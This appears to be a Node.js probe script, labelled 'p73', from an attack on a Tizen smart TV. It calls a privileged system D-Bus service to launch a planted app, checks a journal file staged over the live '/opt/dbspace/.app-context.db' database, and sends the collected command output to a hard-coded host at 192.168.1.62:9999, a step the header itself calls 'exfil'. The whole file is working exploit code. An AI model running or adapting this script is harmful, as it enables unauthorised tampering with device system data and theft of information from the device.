"use strict";

/* p73: launch Probe10 with CORRECT 21-arg signature + verify
   A. full launch_app XML (maxLen 24000) — see the last 2 arg names
   B. launch_app (21 args: s i s s s i i i s + 12x i)
   C. wait 20s -> showing
   D. wait 90s (fresh p71 flow) -> showing + verify + p71 markers
   exfil /p73info
 */

var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var STAGED = '/home/owner/share/tmp/sdk_tools/appctx_hot_journal';
var DST = '/opt/dbspace/.app-context.db-journal';
var LIVE = '/opt/dbspace/.app-context.db';
var APP = 'ProbeTenio.Probe10';
var LITE = 'org.tizen.tv.litewebappservice.server';
var LITE_PATH = '/org/tizen/tv/litewebappservice/server';
var LITE_IFACE = 'org.tizen.tv.litewebappservice.server.interface';
var R = { ts: new Date().toISOString(), probe: 'p73', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(120000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p73info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs, maxLen) {
  maxLen = maxLen || 8000;
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out.substring(0, maxLen);
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, maxLen);
  }
}

function sleepSync(ms) {
  try { cp.execSync('sleep ' + Math.ceil(ms / 1000), { timeout: ms + 30000, maxBuffer: 4096 }); } catch (e) {}
}

function main() {
  /* ---------- A. full XML ---------- */
  R.results.a1_full_xml = run('dbus-send --system --print-reply --dest=' + LITE + ' ' + LITE_PATH + ' org.freedesktop.DBus.Introspectable.Introspect 2>&1', 30000, 24000);

  /* ---------- B. launch 21 args ---------- */
  R.results.b_launch = run('dbus-send --system --print-reply --dest=' + LITE + ' --type=method_call ' + LITE_PATH + ' ' + LITE_IFACE + '.launch_app string:"p73" int32:0 string:"' + APP + '" string:"" string:"p73" int32:0 int32:0 int32:0 string:"launch" int32:1 int32:0 int32:0 int32:0 int32:0 int32:0 int32:0 int32:0 int32:0 int32:0 int32:0 int32:0 2>&1 | head -10', 45000);

  /* ---------- C. wait 20s -> showing ---------- */
  sleepSync(20000);
  R.results.c_showing = run('dbus-send --system --print-reply --dest=' + LITE + ' --type=method_call ' + LITE_PATH + ' ' + LITE_IFACE + '.get_current_showing_app 2>&1 | head -8', 30000);

  /* ---------- D. wait 90s (p71 flow) ---------- */
  sleepSync(90000);
  R.results.d_showing = run('dbus-send --system --print-reply --dest=' + LITE + ' --type=method_call ' + LITE_PATH + ' ' + LITE_IFACE + '.get_current_showing_app 2>&1 | head -8', 30000);
  R.results.d1_verify = run('echo ===DST; md5sum ' + DST + ' 2>&1; echo ===LIVE; md5sum ' + LIVE + ' 2>&1; echo ===DBSPACE; ls -la /opt/dbspace/ 2>&1 | grep -E "p71|total"', 20000);
  R.results.d2_appdir = run('ls -la /opt/usr/home/owner/apps_rw/ProbeTenio/ 2>&1 | head -12', 15000);

  R.results.final = 'done ' + new Date().toISOString();
  L('done');
  postFinal();
  setTimeout(postFinal, 20000);
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
